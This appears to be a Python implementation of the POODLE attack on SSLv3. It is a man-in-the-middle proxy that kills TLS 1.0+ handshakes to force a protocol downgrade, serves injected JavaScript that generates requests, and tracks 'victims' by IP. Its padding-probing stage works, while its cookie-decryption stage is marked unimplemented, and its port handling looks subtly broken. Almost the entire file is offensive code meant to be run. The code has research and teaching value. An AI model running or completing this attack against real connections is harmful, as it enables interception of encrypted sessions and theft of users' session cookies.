#!/usr/bin/python3
# Implementation of the POODLE attack.
# Copyright 2014 Thomas Patzke <thomas@patzke.net>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import argparse
from urllib.parse import urlparse
import sys
import socket
import socketserver
import http.server
import struct
import select
from multiprocessing import Process, Manager
from multiprocessing.managers import BaseManager

from time import sleep

### Configuration ###
# select() timeout
timeout = 30.0

### TLS/SSL ###
class TLSRecord:
    tlsContentType = {20: 'change_cipher_spec', 21: 'alert', 22: 'handshake', 23: 'application_data'}
    TYPE_APPLICATION_DATA = 23

    def __init__(self, rsocket):
        self.raw = rsocket.recv(5)
        if len(self.raw) < 5:
            raise TypeError("Not a SSL/TLS packet")
        self.contentType, self.majorVersion, self.minorVersion, self.length = struct.unpack("!BBBH", self.raw)
        self.textContentType = self.tlsContentType[self.contentType]
        self.content = rsocket.recv(self.length)
        self.raw += self.content
    
    def changeContent(self, newContent):
        self.content = newContent
        self.length = len(newContent)
        self.raw = struct.pack("!BBBH", self.contentType, self.majorVersion, self.minorVersion, self.length) + self.content


class SSLTLSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print_debug("Received connection from {}".format(self.client_address[0]))
        tlsRecord = TLSRecord(self.request)
        victims = self.server.victims

        if tlsRecord.contentType == 0x16 and tlsRecord.majorVersion == 0x03 and tlsRecord.minorVersion > 0x00:       # TLS >= 1.0 handshake -> kill it to degrade!
            print_debug("Protocol minor version {:d} - trying to degrade.".format(tlsRecord.minorVersion))
            return
        else:
            print_debug("Client uses SSLv3")
        
        try:
            # Connect to peer
            self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.forward.connect((args.target_host, args.target_port))
            self.forward.sendall(tlsRecord.raw)

            # Resolve POODLE attack object
            key = self.client_address[0]
            try:
                victim = victims[key]
            except KeyError:
                victim = POODLEAttack()
            
            while (True):
                readable, writable, errors = select.select((self.request, self.forward), (), (self.request, self.forward), timeout)
                if len(errors) > 0:
                    sockname = "unknown"
                    if errors[0] == self.request:
                            sockname = "client-side"
                    elif errors[0] == self.forward:
                            sockname = "server-side"
                    print_debug(sockname + " socket signalizes an error!")
                    break

                for rsocket in readable:
                    ssocket = None
                    rsockname = "unknown"
                    ssockname = "unknown"
                    record = TLSRecord(rsocket)
                    if rsocket == self.forward:
                        ssocket = self.request
                        ssockname = "client"
                        rsockname = "server"
                    else:
                        ssocket = self.forward
                        rsockname = "client"
                        ssockname = "server"
                        # Received encrypted application data with request from client to server - attack
                        # Firefox (and possibly other browsers) inititate communication with a small application data record that doesn't contains the request.
                        # This is not the packet that we want, because of this the length check is performed in addition.
                        if record.contentType == TLSRecord.TYPE_APPLICATION_DATA and len(record.content) > 50:
                            record.changeContent(victim.doAttack(record.content))
                    
                    print_debug("Forwarding TLS record type {} of length {:d} from {} to {}".format(record.textContentType, len(record.raw), rsockname, ssockname))
                    ssocket.sendall(record.raw)
                                    
        except IOError as e:    # expected from network i/o
            print_debug("I/O error: {} ({})".format(e.strerror, e.errno))
        except TypeError:       # Raised by base parsing code if packet is not TLS/SSL
            pass
        except StopIteration:
            pass
        except Exception as e:
            print("Exception: " + str(e))
        finally:
            victim.connectionFinished()
            victims[key] = victim
            self.forward.close()
            print_debug("Connection closed!")


class SSLTLSProxy(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

### HTTP ###
class PoodleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.victims = self.server.victims
        self.key = self.client_address[0]
        try:
            self.victim = victims[self.key]
        except KeyError:
            self.victim = POODLEAttack()

        if self.path == "/":
            self.sendRequestGenerator()
        elif self.path == "/nextRequest":
            self.sendNextRequest()
        self.victims[self.key] = self.victim

    def sendRequestGenerator(self):
        print_debug("HTTP: Sending request generator")
        self.send_response(200);
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.victim.expectTLSPacket()           # make POODLE attack object aware, that a TLS packet related to the attack will arrive
        response = """<!DOCTYPE html>
        <h1>POODLE Request Generator</h1>
        <script type="text/javascript">
        """ + jsCode + """
        </script>
        """
        response = response.replace("###URL###", args.targetURL)
        self.wfile.write(bytes(response, "utf-8"))

    def sendNextRequest(self):
        print_debug("HTTP: Sending next request parameters")
        self.send_response(200);
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        response = "{}:{}".format(self.victim.urlLength, self.victim.postLength)               # FIXME: sooooo un-threadsafe! But race condition shouldn't happen (famous last words (TM))
        self.victim.expectTLSPacket()           # make POODLE attack object aware, that a TLS packet related to the attack will arrive
        self.wfile.write(bytes(response, "utf-8"));

    def version_string(self):
        return "POODLE Request Generator"

### POODLE Attack ###
class POODLEAttack():
    STATE_PADDING = 1   # Fill padding until next length jump
    STATE_DECRYPT = 2   # Decryption stage
    STATE_FINISHED = 3  # Something went wrong, passtrough mode
    def __init__(self):
        self.state = POODLEAttack.STATE_PADDING
        self.lastLength = None          # length of last received encrypted payload
        self.blockSize = None           # cipher block size determined from padding jumps
        self.urlLength = 0              # current length of URL for the web server
        self.postLength = 16            # current length of POST payload for the web server
        self.decryptByte = 256          # Byte from encrypted data to decrypt. 256 is the minimum position where cookies start in common browsers (tested FF+Chromium) requests.
        self.expectPacket = False       # indicator if packet was sent by HTTPS request generator. set when next request parameters are requested

    def expectTLSPacket(self):
        print_debug("POODLE Attack: expecting packet")
        self.expectPacket = True

    def connectionFinished(self):
        print_debug("POODLE Attack: connection finished")
        self.expectPacket = False

    def doAttack(self, appData):
        if not self.expectPacket:       # Packet not expected - this must be signalized by the request generator
            print_debug("POODLE Attack: unexpected packet - forwarding")
            return appData

        if self.state == POODLEAttack.STATE_PADDING:
            if self.lastLength == None:               # first packet - store data length and pass
                self.lastLength = len(appData)
                print_debug("POODLE Attack: received first TLS packet with application data length = {}".format(self.lastLength))
            elif self.lastLength > len(appData) or abs(self.lastLength - len(appData)) > 16:      # length jump in the wrong direction or unexpected amount, just pass it
                print_debug("POODLE Attack: received packet ignored due to unexpected length jump. previous={} this={}".format(self.lastLength, len(appData)))
            elif self.lastLength < len(appData):      # length jump, we know the padding length
                self.blockSize = len(appData) - self.lastLength         # difference is block size
                self.state = POODLEAttack.STATE_DECRYPT
                print_debug("POODLE Attack: application data length jump detected - padding length is now known! length={} block size={}".format(len(appData), self.blockSize))
            else:                                       # add further byte to POST data
                self.postLength += 1
                print_debug("POODLE Attack: adding a byte to POST data: {} bytes".format(self.postLength))
            return appData
        elif self.state == POODLEAttack.STATE_DECRYPT:  # decryption stage of the attack
            print_debug("POODLE Attack: decryption attack (unimplemented)!")
            return appData                              # TODO: not yet implemented
        else:                                           # in any other case (including STATE_FINISHED): pass packets unaltered
            print_debug("POODLE Attack: attack finished or undefined state - passing packet")
            return appData


class POODLEManager(BaseManager):
    pass

POODLEManager.register('POODLEAttack', POODLEAttack)

### Functions ###
def ssltlsServer(victims, poodleManager):
    print("Starting SSL/TLS server on {}:{} forwarding to {}:{}".format(args.listen_host, args.listen_port_tls, args.target_host, args.target_port))
    server = SSLTLSProxy((args.listen_host, int(args.listen_port_tls)), SSLTLSHandler)
    server.victims = victims
    server.poodleManager = poodleManager
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Shutdown of SSL/TLS server on user request")

def httpServer(victims, poodleManager):
    print("Starting HTTP server on {}:{} generating requests to {}".format(args.listen_host, args.listen_port_http, args.targetURL))
    server = http.server.HTTPServer((args.listen_host, int(args.listen_port_http)), PoodleHTTPRequestHandler)
    server.victims = victims
    server.poodleManager = poodleManager
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Shutdown of HTTP server on user request")

def print_debug(msg):
    if args.debug:
        print(msg)

### Main ###
argparser = argparse.ArgumentParser(description="The POODLE Attack")
argparser.add_argument("targetURL", help="Target URL. Requests are performed against this URL and TLS forwardings are derived from this.")
argparser.add_argument("--listen-host", "-lh", default="", help="TLS/SSL and HTTP listening host")
argparser.add_argument("--listen-port-tls", "-lpt", default="8443", help="TLS/SSL listening port")
argparser.add_argument("--listen-port-http", "-lph", default="8000", help="HTTP listening port")
argparser.add_argument("--target-host", "-th", default=None, help="Target host override, normally derived from target URL")
argparser.add_argument("--target-port", "-tp", default=None, help="Target port override, normally derived from target URL")
argparser.add_argument("--debug", "-d", action="store_true", help="Debugging output")
args = argparser.parse_args()
targetURL = urlparse(args.targetURL)
args.target_host = args.target_host or targetURL.hostname
args.target_port = int(args.target_port) or int(targetURL.port) or 443
if targetURL.scheme != "https":
    print("Target must be HTTPS URL!");
    sys.exit(1)
if args.target_host == None:
    print("Can't determine target host!");
    sys.exit(2)

jsFile = open("POODLEClient.js", "r")
jsCode = jsFile.read()
jsFile.close()

manager = Manager()
poodleManager = POODLEManager()
poodleManager.start()

victims = manager.dict()

poodleSSLTLSServer = Process(target=ssltlsServer, args=(victims, poodleManager))
poodleSSLTLSServer.start()
poodleHTTPServer = Process(target=httpServer, args=(victims, poodleManager))
poodleHTTPServer.start()

try:
    poodleSSLTLSServer.join()
    poodleHTTPServer.join()
except KeyboardInterrupt:
    print("Bye!")
